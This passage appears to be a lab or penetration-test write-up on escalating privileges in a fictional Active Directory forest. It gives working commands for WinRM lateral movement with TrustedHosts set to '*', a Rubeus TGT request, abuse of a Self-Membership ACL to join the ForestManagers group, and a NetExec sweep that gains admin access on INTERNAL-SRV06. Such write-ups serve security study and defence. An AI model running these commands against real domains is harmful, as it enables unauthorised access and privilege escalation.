```powershell
# FROM IT-SQLSRV02
winrm set winrm/config/client '@{TrustedHosts="*"}'
winrs -r:10.200.8.10 -u:msp\mspdb -p:"REDACTED_SECRET" cmd
```

## ATTACK CHAIN

1. Compromised credentials (`msp\mspdb`) → access to `MSP-SQLREPORT` → `Self-Membership` on `ForestManagers` → added to `ForestManagers` → `Self-Membership` on `InternalAdmins` → added to `InternalAdmins` → privilege chaining through group membership

## EXPLOITATION

```
Compromised credentials (mspdb)
        ↓
Initial access → MSP-SQLREPORT
        ↓
Intra-forest LDAP enumeration
        ↓
Self-Membership ACL identified
        ↓
ForestManagers group abuse
        ↓
Privilege escalation in internal.msp.example
        ↓
Lateral movement → INTERNAL-SRV06
```

#### Vector 1: Lateral Movement to msp-srv01

```powershell
# FROM MSP-SQLREPORT
winrm set winrm/config/client '@{TrustedHosts="10.200.8.22"}'
winrs -r:10.200.8.22 -u:msp\mspdb -p:"REDACTED_SECRET" cmd
```

The connection succeeds, confirming lateral movement capability to `msp-srv01`. However, post-compromise enumeration of the system did not yield additional credentials or configurations enabling further expansion from that host.

#### Vector 2: Self-Membership Abuse on ForestManagers

#### 1. Establish Kerberos Context

A TGT is requested for `mspdb` to perform LDAP operations under that identity.

```powershell
.\Rubeus.exe asktgt /user:mspdb /domain:msp.example /password:REDACTED_SECRET
```

#### 2. Add mspdb to ForestManagers

```powershell
# AD Module
$mspdb = Get-ADUser -Identity mspdb -Server msp.example; Add-ADGroupMember -Identity ForestManagers -Members $mspdb -Server internal.msp.example

# ADSI
$group = [ADSI]"LDAP://CN=ForestManagers,CN=Users,DC=internal,DC=msp,DC=local"
$group.Add("LDAP://<SID=S-1-5-21-2998733414-582960673-4099777928-1107>")

# Verify
Get-ADGroupMember -Identity ForestManagers -Server internal.msp.example
# distinguishedName : CN=mspdb,CN=Users,DC=msp,DC=local
# name              : mspdb
# objectClass       : user
# objectGUID        : 9158587d-8b16-4b38-a013-0bfd1f2a5aaf
# SamAccountName    : mspdb
# SID               : S-1-5-21-2998733414-582960673-4099777928-1107
```

#### 3. Validate Administrative Access via WinRM

`ForestManagers` local admin rights on specific hosts are not directly visible via LDAP/GPO — they may be defined locally on the host. With a small number of hosts in the domain, direct WinRM validation was used as an empirical but efficient approach.

```powershell
# Build host list
cat .\hosts.txt
# internal-dc01.internal.msp.example
# internal-batch.internal.msp.example
# internal-srv06.internal.msp.example

# Test remote authentication via WinRM
.\nxc winrm .\hosts.txt -u mspdb -p "REDACTED_SECRET" -d msp.example
# WINRM  10.200.8.75  5985   INTERNAL-SRV06   [+] msp.example\REDACTED_SECRET (Pwn3d!)
```

> `ForestManagers` has local administrator rights on `INTERNAL-SRV06`.

The `-d msp.example` flag is required because the credentials belong to the `msp.example` domain, even though the target systems are members of `internal.msp.example` — valid due to the intra-forest parent-child trust.

#### 4. Lateral Movement to internal.msp.example (INTERNAL-SRV06)

```powershell
# Option 1
winrm set winrm/config/client '@{TrustedHosts="*"}'
winrs -r:10.200.8.75 -u:msp\mspdb -p:"REDACTED_SECRET" cmd

# Option 2
winrs.exe -r:internal-srv06.internal.msp.example cmd
```

`ForestManagers` membership confers effective local administrator privileges on `INTERNAL-SRV06` — no explicit `LocalAdmins` membership was required.
